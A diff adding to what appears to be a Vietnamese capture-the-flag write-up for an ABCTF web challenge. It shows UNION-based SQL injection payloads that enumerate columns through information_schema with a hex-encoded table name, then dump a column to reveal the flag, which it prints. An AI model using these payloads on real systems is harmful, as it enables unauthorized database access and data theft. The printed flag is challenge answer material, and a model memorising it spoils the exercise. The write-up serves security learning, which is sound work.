@@ -43,3 +43,23 @@ Trích xuất tables rồi đến trích xuất columns, vẫn sử dụng funct
 **-1 union all select null,null,GROUP_CONCAT(column_name SEPARATOR 0x3c62723e),null from information_schema.columns WHERE TABLE_NAME=0x7730775f7930755f6630756e645f6d33--**
 
 **0x7730775f7930755f6630756e645f6d33 thực chất là dạng hex của string "w0w_y0u_f0und_m3"**
+
+Kết quả:
+
+```
+Name:
+Breed:
+Color: f0und_m3
+```
+Bây giờ mình sẽ dump dữ liệu từ column **f0und_m3**
+
+**-1 union all select null,null,GROUP_CONCAT(f0und_m3 SEPARATOR 0x3c62723e),null FROM webeight.w0w_y0u_f0und_m3**
+
+Kết quả:
+
+```
+Name:
+Breed:
+Color: abctf{uni0n_1s_4_gr34t_c0mm4nd}
+```
+Flag: **abctf{uni0n_1s_4_gr34t_c0mm4nd}**
